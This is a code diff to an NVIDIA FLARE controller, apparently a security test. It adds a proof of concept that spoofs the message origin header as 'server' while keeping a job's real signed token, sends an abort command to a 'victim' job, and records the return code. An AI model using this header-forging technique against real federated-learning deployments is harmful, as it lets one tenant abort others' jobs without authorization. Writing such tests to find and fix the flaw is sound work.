@@ -25,6 +25,7 @@ from nvflare.apis.executor import Executor
 from nvflare.apis.impl.controller import Controller
 from nvflare.apis.shareable import ReservedHeaderKey, Shareable
 from nvflare.fuel.f3.cellnet.defs import CellChannel, MessageHeaderKey
+from nvflare.fuel.f3.streaming.stream_const import StreamHeaderKey
 from nvflare.private.defs import new_cell_message
 
 
@@ -80,6 +81,30 @@ class ControlController(Controller):
         data = Shareable({"victim": self.victim})
         task = Task("attack" if self.victim else "hold", data, timeout=90, result_received_cb=self.received)
         self.broadcast_and_wait(task, fl_ctx, min_responses=1, abort_signal=abort_signal)
+        if self.victim:
+            cell = fl_ctx.get_engine().get_cell()
+
+            def claim_parent(request):
+                if (
+                    request.get_header(StreamHeaderKey.CHANNEL) == CellChannel.SERVER_COMMAND
+                    and request.get_header(StreamHeaderKey.TOPIC) == "abort"
+                ):
+                    request.set_header(MessageHeaderKey.ORIGIN, "server")
+
+            # Keep the job's real signed token; change only the claimed sender after transport stamping.
+            cell.core_cell.add_outgoing_request_filter("*", "*", claim_parent)
+            reply = cell.send_request(
+                channel=CellChannel.SERVER_COMMAND,
+                topic="abort",
+                target=f"server.{self.victim}",
+                request=new_cell_message({}, Shareable()),
+                timeout=3,
+            )
+            record(
+                fl_ctx,
+                "forged_origin.json",
+                {"sender": cell.get_fqcn(), "rc": reply.get_header(MessageHeaderKey.RETURN_CODE)},
+            )
 
     def received(self, client_task, fl_ctx):
         record(fl_ctx, "received.json", {k: v for k, v in client_task.result.items() if k != ReservedHeaderKey.HEADERS})
